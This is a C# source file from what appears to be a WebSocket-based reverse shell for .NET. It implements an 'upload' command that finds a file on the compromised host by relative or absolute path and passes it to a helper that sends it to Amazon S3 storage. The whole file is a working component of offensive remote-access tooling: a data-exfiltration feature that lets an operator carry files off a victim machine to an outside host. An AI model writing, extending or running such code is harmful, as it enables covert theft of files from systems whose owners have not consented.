using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class UploadToS3 : Command
    {
        public string ExecuteCommand(string command)
        {
            List<string> commands = DataManuplationUtil.StringToList(command, " ");

            // edge cases
            if (commands.Count > 0 && commands[0].Equals("upload", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);
                FileInfo fileToUpload = null;

                try
                {
                    fileToUpload = GetDesiredFile(string.Join(" ", commands));
                }
                catch (Exception e)
                {
                    return e.Message;
                }

                return S3Uploadutil.UploadToS3(fileToUpload);
            }

            return "There is a problem with the command";
        }




        private FileInfo GetDesiredFile(string path)
        {
            FileInfo relativeFile = new FileInfo(Path.Combine(SystemCommandUtil.CurrentWorkingDir.FullName, path));
            FileInfo absoluteFile = new FileInfo(path);

            if (relativeFile.Exists && !relativeFile.Attributes.HasFlag(FileAttributes.Directory))
            {
                return relativeFile;
            }
            else if (absoluteFile.Exists && !absoluteFile.Attributes.HasFlag(FileAttributes.Directory))
            {
                return absoluteFile;
            }
            else
            {
                throw new Exception("File not found: " + path);
            }
        }
    }
}
